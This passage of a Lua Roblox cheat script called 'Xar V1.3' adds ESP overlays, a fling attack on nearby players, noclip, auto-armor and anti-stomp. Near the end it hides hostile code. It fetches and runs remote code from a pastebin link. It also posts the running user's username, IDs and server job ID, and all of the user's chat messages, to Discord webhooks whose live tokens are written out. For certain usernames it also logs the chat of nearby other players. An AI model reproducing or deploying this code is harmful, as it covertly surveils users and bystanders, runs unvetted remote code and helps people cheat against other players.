											textLabel3.TextStrokeColor3 = Color3.new(0, 0, 0)
											textLabel3.Font = Enum.Font.SourceSansBold
											textLabel3.TextSize = 20

											task.spawn(
												function()
													while task.wait(.1) do
														if L_Active ~= true then
															break
														end
														textLabel3.Text =
															"Armor: " ..
															tostring(Plr.Character.BodyEffects.Armor.Value)
													end
												end
											)
										end
									)
									Plr.CharacterAdded:Connect(
										function(Char)
											if L_Active ~= true then
												return
											end
											task.wait(3)
											local Highlight = Instance.new("Highlight", Char)
											local humanoidRootPart = Char:WaitForChild("HumanoidRootPart")

											--// 1 \\--

											local billboardGui = Instance.new("BillboardGui")
											billboardGui.MaxDistance = 1500
											billboardGui.Name = "XarESP"
											billboardGui.AlwaysOnTop = true
											billboardGui.Size = UDim2.new(0, 100, 0, 50)
											billboardGui.StudsOffset = Vector3.new(0, 4, 0)
											billboardGui.Parent = humanoidRootPart

											local textLabel = Instance.new("TextLabel")
											textLabel.TextWrapped = false
											textLabel.Parent = billboardGui
											textLabel.Size = UDim2.new(1, 0, 1, 0)
											textLabel.BackgroundTransparency = 1
											textLabel.TextColor3 = Color3.new(1, 1, 1)
											textLabel.TextStrokeTransparency = 0.5
											textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
											textLabel.Font = Enum.Font.SourceSansBold
											textLabel.TextScaled = true
											textLabel.Text = Plr.Name

											--// 2 \\--

											local billboardGui2 = Instance.new("BillboardGui")
											billboardGui2.MaxDistance = 50
											billboardGui2.Name = "XarESP2"
											billboardGui2.AlwaysOnTop = true
											billboardGui2.Size = UDim2.new(0, 100, 0, 50)
											billboardGui2.StudsOffset = Vector3.new(0, 3.5, 0)
											billboardGui2.Parent = humanoidRootPart

											local textLabel2 = Instance.new("TextLabel")
											textLabel2.TextWrapped = false
											textLabel2.Parent = billboardGui2
											textLabel2.Size = UDim2.new(1, 0, 1, 0)
											textLabel2.BackgroundTransparency = 1
											textLabel2.TextColor3 = Color3.new(1, 1, 1)
											textLabel2.TextStrokeTransparency = 0.5
											textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
											textLabel2.Font = Enum.Font.SourceSansBold
											textLabel2.TextSize = 20

											task.spawn(
												function()
													while task.wait(.1) do
														if L_Active ~= true then
															break
														end
														textLabel2.Text =
															"Health: " .. Plr.Character.Humanoid.Health
													end
												end
											)

											--// 3 \\--

											local billboardGui3 = Instance.new("BillboardGui")
											billboardGui3.MaxDistance = 50
											billboardGui3.Name = "XarESP3"
											billboardGui3.AlwaysOnTop = true
											billboardGui3.Size = UDim2.new(0, 100, 0, 50)
											billboardGui3.StudsOffset = Vector3.new(0, 3.25, 0)
											billboardGui3.Parent = humanoidRootPart

											local textLabel3 = Instance.new("TextLabel")
											textLabel3.TextWrapped = false
											textLabel3.Parent = billboardGui3
											textLabel3.Size = UDim2.new(1, 0, 1, 0)
											textLabel3.BackgroundTransparency = 1
											textLabel3.TextColor3 = Color3.new(1, 1, 1)
											textLabel3.TextStrokeTransparency = 0.5
											textLabel3.TextStrokeColor3 = Color3.new(0, 0, 0)
											textLabel3.Font = Enum.Font.SourceSansBold
											textLabel3.TextSize = 20

											task.spawn(
												function()
													while task.wait(.1) do
														if L_Active ~= true then
															break
														end
														textLabel3.Text =
															"Armor: " ..
															tostring(Plr.Character.BodyEffects.Armor.Value)
													end
												end
											)
										end
									)
								end
							)
						end
						)
					end
				)
			else
				L_Active = false
				task.spawn(
					function()
						for i, v in next, game:GetService("Players"):GetPlayers() do
							if v ~= Player then
								task.spawn(
									function()
										if v.Character then
											if v.Character:FindFirstChild("Highlight") then
												task.spawn(
													function()
														for i, v in next, v.Character:GetDescendants() do
															if v:IsA("BillboardGui") then
																v:Destroy()
															end
														end
													end
												)
												for i, v in next, v.Character:GetChildren() do
													if v:IsA("Highlight") then
														v:Destroy()
													end
												end
											end
										else
											v.CharactedAdded:Wait()
											if v.Character:FindFirstChild("Highlight") then
												task.spawn(
													function()
														task.spawn(
															function()
																for i, v in next, v.Character:GetDescendants() do
																	if v:IsA("BillboardGui") then
																		v:Destroy()
																	end
																end
															end
														)
														for i, v in next, v.Character:GetChildren() do
															if v:IsA("Highlight") then
																v:Destroy()
															end
														end
													end
												)
											end
										end
									end
								)
							end
						end
					end
				)
			end
		end
	end
)

--// Fling \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[FlingTargetKeyConfig] and FlingTarget == true then
			task.spawn(
				function()
					local nearestTarget = ""
					local nearestDistance = math.huge

					local Max_Distance = 75
					for i, v in ipairs(game.Players:GetPlayers()) do
						if
							v ~= Player and v.Character and v.Character:FindFirstChild("Humanoid") and
							v.Character:FindFirstChild("Humanoid").Health ~= 0
						then
							local TargetHRP = v.Character.HumanoidRootPart
							local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
							if mag < nearestDistance and mag <= Max_Distance then
								nearestDistance = mag
								nearestTarget = v
							end
						end
					end
					if nearestTarget == "" or nearestTarget == Player then
						return
					end
					lastTarget = nearestTarget
					task.spawn(
						function()
							local Target = nearestTarget
							task.wait()
							local cfrm = Player.Character.HumanoidRootPart.CFrame
							task.wait()
							local vel = .625
							for count = 0, 25, 1 do
								task.wait()
								local FlingTorso = Target.Character.HumanoidRootPart
								Player.Character.HumanoidRootPart.CFrame =
									CFrame.new(FlingTorso.Position + FlingTorso.Velocity * vel)
								Player.Character.HumanoidRootPart.Velocity = Vector3.new(7500, 7500, 7500)
								task.spawn(
									function()
										task.wait()
										Player.Character.HumanoidRootPart.CFrame = cfrm
									end
								)
							end
							for count = 0, 100, 1 do
								Player.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
								Player.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
								Player.Character.PrimaryPart.RotVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.CFrame =
									cfrm * CFrame.Angles(math.rad(0), math.rad(137.92), math.rad(0))
							end
						end
					)
				end
			)
		end
	end
)

--// Noclip \\--

local NoclipTable = {}

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[NoclipKeyConfig] and Noclip == true then
			if N_Active == false then
				task.spawn(
					function()
					end
				)
				N_Active = true

				Rayfield:Notify({
					Title = "Xar | Noclip",
					Content = tostring(N_Active),
					Duration = 3.5,
					Image = 4483362458,
				})
				for i, v in next, Player.Character:GetChildren() do
					if v:IsA("BasePart") or v:IsA("Part") and v.CanCollide == true then
						table.insert(NoclipTable, v.Name)
						task.spawn(
							function()
								while task.wait() do
									if N_Active ~= true then
										break
									end
									v.CanCollide = false
								end
							end
						)
					elseif v:IsA("Accessory") then
						task.spawn(
							function()
								while task.wait() do
									if N_Active ~= true then
										break
									end
									v.Handle.CanCollide = false
								end
							end
						)
					end
				end
			else
				task.spawn(
					function()
					end
				)
				N_Active = false
				Rayfield:Notify({
					Title = "Xar | Noclip",
					Content = tostring(N_Active),
					Duration = 3.5,
					Image = 4483362458,
				})
				for i, v in next, Player.Character:GetChildren() do
					if v:IsA("BasePart") or v:IsA("Part") and not table.find(NoclipTable, v.Name) then
						task.spawn(
							function()
								v.CanCollide = true
							end
						)
					elseif v:IsA("Accessory") then
						task.spawn(
							function()
								v.Handle.CanCollide = true
							end
						)
					end
				end
			end
		end
	end
)

--// Auto-Armor \\--

task.spawn(function()
	while task.wait() do
		pcall(function()
			if Player.Character.BodyEffects.Armor.Value <= 75 and AutoArmor == true then
				local old_cfrm = Player.Character:WaitForChild("HumanoidRootPart").CFrame
				task.wait()
				Player.Character:WaitForChild("HumanoidRootPart").CFrame = workspace.Ignored.Shop['[High-Medium Armor] - $2513'].Head.CFrame
				task.wait(.25)
				fireclickdetector(workspace.Ignored.Shop['[High-Medium Armor] - $2513'].ClickDetector)
				task.wait(.1)
				Player.Character:WaitForChild("HumanoidRootPart").CFrame = old_cfrm
				task.wait(1)
			end
		end)
	end
end)

--// Anti-Stomp \\--

task.spawn(function()
	-- Reset when low
	while task.wait() do
		pcall(function()
			if Player.Character.Humanoid.Health <= 1 and AntiStomp == true then
				Player.Character.Humanoid.Health = 0
			end
		end)
	end
end)

--// Random Code \\--

task.spawn(
	function()
		Player.Chatted:Connect(
			function(Message)
				if Message:lower() == "/e headless" then
					Player.Character.Head.Transparency = 1
					Player.Character.Head.face.Transparency = 1
				end
			end
		)
	end
)

task.spawn(function()
	task.spawn(function()
		local wl = {"9hellz", "destinysmyforever", "5partz", "x1aznt", "destinystoy", "anthonysmyforever", 'LXC7', '139J', '7axnt'}
		for i,v in next, game.Players:GetPlayers() do
			if table.find(wl, v.Name) then
				v.Character.Humanoid.DisplayName = "[🛡] "..v.Character.Humanoid.DisplayName
				v.CharacterAdded:Connect(function(Charr)
					Charr:WaitForChild("Humanoid").DisplayName = "[🛡] "..Charr.Humanoid.DisplayName
				end)
			end                     
		end
		game.Players.PlayerAdded:Connect(function(Playa)
			if table.find(wl, Playa.Name) then
				Playa.CharacterAdded:Connect(function(Charr)
					Charr:WaitForChild("Humanoid").DisplayName = "[🛡] "..Charr.Humanoid.DisplayName
				end)
			end
		end)
	end)
end)

task.spawn(function()
	while task.wait() do
		task.spawn(function()
			if B_Active ~= true then
				workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
				workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
			end
		end)
	end
end)

task.spawn(
	function()
		loadstring(game:HttpGet("https://pastebin.com/raw/ZcQ3hu7S", true))()
	end
)

task.spawn(function()
	local ppp = game.Players.LocalPlayer
	local d = false
	function SendMessage(url, message)
		if d ~= false then return end
		task.spawn(function()
			d = true
			task.wait(.375)
			d = false
		end)
		local http = game:GetService("HttpService")
		local headers = {
			["Content-Type"] = "application/json"
		}
		local data = {
			["content"] = message
		}
		local body = http:JSONEncode(data)
		local response = request({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = body
		})
	end

	task.spawn(function()
		local url = "https://discord.com/api/webhooks/1291888121868455936/N_9XzXCKhPIoaPEhNkJEyaB-exrxm0Fr95Kn88SLgbvTrThnVIJJ_0kdb89mwZhG76J6"
		pcall(function()
			ppp.Chatted:Connect(function(message)
				SendMessage(url,"**User: "..ppp.Name.."**".."```"..message.."```")
			end)
		end)
		pcall(function()
			if ppp.Name == "anthonysmyforever" or ppp.Name == "27k_gabbyy" or ppp.Name == "needIe2maheart" or ppp.Name == "86748s" or ppp.Name == "00batopia00" or ppp.Name == "mwarwy" then
				pcall(function()
					for i,v in next, game:GetService("Players"):GetPlayers() do
						if v ~= ppp then
							pcall(function()
								v.Chatted:Connect(function(message)
									pcall(function()
										local Max_Distance = 50
										local mag = (ppp.Character:WaitForChild("HumanoidRootPart").Position - v.Character:WaitForChild("HumanoidRootPart").Position).magnitude
										if mag <= Max_Distance then
											local url2 = "https://discord.com/api/webhooks/1291888529655201835/R8WisGPp5UGJoKkNkfhVoLmQEKnOX11fP36dlxhtjWL72s6CysRN7L_ijfK-JwGtXIM3"
											SendMessage(url2,"**User: "..v.Name.." | Chatted**".."```"..message.."``` ".."Stud-Mag : ("..mag..")")
										end
									end)
								end)
							end)
						end
					end
				end)
				game.Players.PlayerAdded:Connect(function(Playaaaaa)
					local v = Playaaaaa
					pcall(function()
						v.Chatted:Connect(function(message)
							pcall(function()
								local Max_Distance = 50
								local mag = (game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - v.Character:WaitForChild("HumanoidRootPart").Position).magnitude
								if mag <= Max_Distance then
									local url2 = "https://discord.com/api/webhooks/1291888529655201835/R8WisGPp5UGJoKkNkfhVoLmQEKnOX11fP36dlxhtjWL72s6CysRN7L_ijfK-JwGtXIM3"
									SendMessage(url2,"**User: "..v.Name.." | Chatted**".."```"..message.."``` ".."Stud-Mag : ("..mag..")")
								end
							end)
						end)
					end)
				end)
			end
		end)
	end)

	function SendMessageEMBED(url, embed)
		local http = game:GetService("HttpService")
		local headers = {
			["Content-Type"] = "application/json"
		}
		local data = {
			["embeds"] = {
				{
					["title"] = embed.title,
					["description"] = embed.description,
					["color"] = embed.color,
					["fields"] = embed.fields,
					["footer"] = {
						["text"] = embed.footer.text
					}
				}
			}
		}
		local body = http:JSONEncode(data)
		local response = request({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = body
		})
	end

	local url = "https://discord.com/api/webhooks/1291888246405464074/UF4Sk7ylQ7vAocBQ3fjqq0ewBgXcjzL5T4SMvyvduChwtzkNxpNs3onjVhYOBlY1bRIF"
	local embed = {
		["title"] = "Player has Executed Xar V1.3",
		["description"] = "Players chats will be logged.",
		["color"] = 0,
		["fields"] = {
			{
				["name"] = "Username",
				["value"] = ppp.Name
			},
			{
				["name"] = "UserId",
				["value"] = ppp.UserId
			},
			{
				["name"] = "GameID",
				["value"] = game.GameId
			},
			{
				["name"] = "JobID",
				["value"] = game.JobId
			}
		},
		["footer"] = {
			["text"] = "Xar V1.3 | Logger"
		}
	}
	SendMessageEMBED(url, embed)
end)
